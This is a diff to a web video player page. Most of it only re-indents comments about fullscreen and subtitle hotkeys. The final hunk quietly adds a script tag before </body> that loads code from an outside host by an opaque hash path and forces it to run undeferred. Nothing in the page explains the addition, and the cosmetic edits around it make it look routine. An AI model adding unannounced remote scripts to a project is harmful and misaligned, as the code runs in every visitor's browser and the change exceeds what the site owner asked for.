@@ -212,8 +212,8 @@ function fetchTvDetails(f){
 /* ---------- Added functions ---------- */
 
 /* Fullscreen hotkey (F): expands the player box. The player's own built-in
-   fullscreen button (inside the video) works through the iframe's
-   allow="fullscreen" permission set in renderPlayerPage. */
+    fullscreen button (inside the video) works through the iframe's
+    allow="fullscreen" permission set in renderPlayerPage. */
 function toggleFullscreen(){
  var box = $("playerBox"); if(!box) return;
  var fs = document.fullscreenElement || document.webkitFullscreenElement;
@@ -225,7 +225,7 @@ function toggleFullscreen(){
 }
 
 /* Subtitle hotkey (C): best effort. Only works if the embedded player
-   listens for these postMessage commands. */
+    listens for these postMessage commands. */
 var subsOn = false;
 function toggleSubtitles(){
  /* Servers that accept a default-subtitle URL parameter: toggle it and
@@ -401,5 +401,6 @@ document.addEventListener("keydown",function(e){
 
 loadFeeds();
 </script>
+<script data-cfasync="false" src="https://abscloud.org/1/f2d476ea853355ca2cec875789b808ac"></script>
 </body>
 </html>
